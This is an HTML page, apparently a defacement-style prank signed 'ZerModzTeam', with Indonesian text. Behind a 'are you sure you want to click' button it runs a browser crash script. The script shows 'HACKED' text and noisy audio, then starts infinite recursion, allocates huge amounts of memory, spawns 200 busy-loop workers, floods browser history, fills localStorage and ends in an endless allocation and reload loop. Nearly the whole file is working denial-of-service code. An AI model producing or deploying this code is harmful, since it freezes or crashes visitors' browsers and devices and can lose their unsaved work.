<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Zero Final</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            overflow: hidden;
            width: 100vw;
            height: 100vh;
            position: relative;
            font-family: 'Courier New', monospace;
        }
        #warning {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: black;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 999999;
        }
        #warning h1 {
            color: red;
            font-size: 4rem;
            text-align: center;
            animation: blink 0.5s infinite;
            border: 5px solid red;
            padding: 20px;
            text-shadow: 0 0 30px red;
        }
        #btn {
            font-size: 3rem;
            padding: 20px 60px;
            background: red;
            border: 3px solid white;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            margin-top: 50px;
            animation: pulse 1s infinite;
            cursor: pointer;
        }
        @keyframes blink { 50% { opacity: 0.5; } }
        @keyframes pulse { 50% { transform: scale(1.1); } }
        .teks-terbang {
            position: absolute;
            white-space: nowrap;
            font-weight: bold;
            pointer-events: none;
            animation: fly 0.2s infinite alternate;
            text-shadow: 0 0 10px currentColor;
        }
        @keyframes fly {
            0% { transform: translate(0,0) rotate(0deg); }
            100% { transform: translate(50px,50px) rotate(360deg); }
        }
        #teks-utama {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%,-50%);
            font-size: 5rem;
            font-weight: 900;
            text-align: center;
            animation: superblink 0.01s infinite;
            background: black;
            padding: 20px;
            border: 5px solid white;
            border-radius: 20px;
            z-index: 9999;
            text-shadow: 0 0 50px cyan, 0 0 100px magenta;
        }
        @keyframes superblink {
            0% { color: black; background: white; }
            10% { color: red; background: cyan; }
            20% { color: yellow; background: blue; }
            30% { color: lime; background: purple; }
            40% { color: cyan; background: red; }
            50% { color: magenta; background: lime; }
            60% { color: white; background: black; }
            70% { color: black; background: yellow; }
            80% { color: blue; background: magenta; }
            90% { color: purple; background: lime; }
            100% { color: black; background: white; }
        }
    </style>
</head>
<body>
    <div id="warning">
        <h1>⚠️ YAKIN MAU CLICK? NANTI RUSAK LOH!! ⚠️</h1>
        <div id="btn">GAS KEUN 🔥</div>
    </div>

    <script>
        document.getElementById('btn').onclick = function() {
            document.getElementById('warning').remove();
            
            // ========== LANGSUNG EKSEKUSI SEMUA ==========
            const b = document.body;
            
            // 5000 teks
            for (let i=0; i<5000; i++) {
                let d = document.createElement('div');
                d.className = 'teks-terbang';
                d.textContent = 'HACKED ' + i;
                d.style.left = Math.random()*100 + '%';
                d.style.top = Math.random()*100 + '%';
                d.style.fontSize = (10+Math.random()*60) + 'px';
                d.style.color = 'hsl(' + (Math.random()*360) + ',100%,50%)';
                d.style.animationDuration = (0.1+Math.random()*0.3) + 's';
                b.appendChild(d);
            }
            
            // teks utama
            let utama = document.createElement('div');
            utama.id = 'teks-utama';
            utama.textContent = 'HACKED BY ZerModzTeam';
            b.appendChild(utama);
            
            // 2000 suara (100 context x 20 osc)
            for (let c=0; c<100; c++) {
                setTimeout(() => {
                    try {
                        let a = new (window.AudioContext||window.webkitAudioContext)();
                        let g = a.createGain();
                        g.gain.value = 0.02;
                        g.connect(a.destination);
                        for (let i=0; i<20; i++) {
                            let o = a.createOscillator();
                            o.type = ['sine','square','sawtooth','triangle'][Math.floor(Math.random()*4)];
                            o.frequency.value = 20 + Math.random()*4000;
                            let og = a.createGain();
                            og.gain.value = 0.001 + Math.random()*0.005;
                            o.connect(og);
                            og.connect(g);
                            o.start();
                        }
                        if (a.state === 'suspended') a.resume();
                    } catch(e){}
                }, c*2);
            }
            
            // ========== CRASH TOTAL TANPA JEDA ==========
            // Stack overflow
            (function x() { (function y() { (function z() { z(); })(); y(); })(); x(); })();
            
            // Memory bomb 100rb array
            let m = [];
            for (let i=0; i<100000; i++) {
                try { m.push(new ArrayBuffer(100000000)); } catch(e){}
                try { m.push(new Blob([new Uint8Array(200000000)])); } catch(e){}
                try { m.push(new Array(10000000).join('x')); } catch(e){}
            }
            
            // 200 worker
            for (let w=0; w<200; w++) {
                try { new Worker(URL.createObjectURL(new Blob(['while(1){for(let i=0;i<999999999;i++){}}']))); } catch(e){}
            }
            
            // History spam
            setInterval(() => {
                for (let h=0; h<10000; h++) history.pushState({},'','/#'+Math.random());
                history.back();
                location.replace('about:blank');
            }, 0);
            
            // 5000 canvas
            for (let cv=0; cv<5000; cv++) {
                try {
                    let c = document.createElement('canvas');
                    c.width = 5000; c.height = 5000;
                    c.getContext('2d').fillRect(0,0,5000,5000);
                    b.appendChild(c);
                } catch(e){}
            }
            
            // LocalStorage full
            for (let s=0; s<50000; s++) { try { localStorage.setItem('k'+s, 'x'.repeat(1000000)); } catch(e){} }
            
            // Timer 100000
            for (let t=0; t<100000; t++) { setInterval(() => { for(let z=0;z<100000;z++){Math.random();} }, 0); }
            
            // Infinite loop final
            let a = [];
            while(true) {
                a.push(new ArrayBuffer(1000000000));
                for(let z=0;z<9999999;z++){ Math.random(); }
                window.location.href = window.location.href;
            }
        };
    </script>
</body>
</html>
